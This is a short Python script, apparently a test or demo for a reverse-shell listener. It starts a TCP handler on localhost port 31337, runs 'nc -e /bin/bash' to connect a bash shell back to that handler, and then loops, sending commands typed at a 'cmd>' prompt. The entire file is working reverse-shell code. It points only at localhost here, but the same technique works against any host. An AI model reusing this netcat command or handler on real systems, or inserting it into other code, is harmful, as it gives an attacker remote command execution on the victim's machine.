import sys
import subprocess
from network.reverse_tcp import Handler

hnd = Handler("localhost", 31337)
hnd.start()

subprocess.Popen("nc -e /bin/bash localhost 31337", shell=True)

while True:
	try:
		if hnd.connection is not None:
			while not hnd.waiting_for_response:
				hnd.send_command(input("cmd> "))
	except KeyboardInterrupt as ke:
		hnd.stop(keyboard_killed=True)
		print("[***] sys.exit(0)")
		sys.exit(0)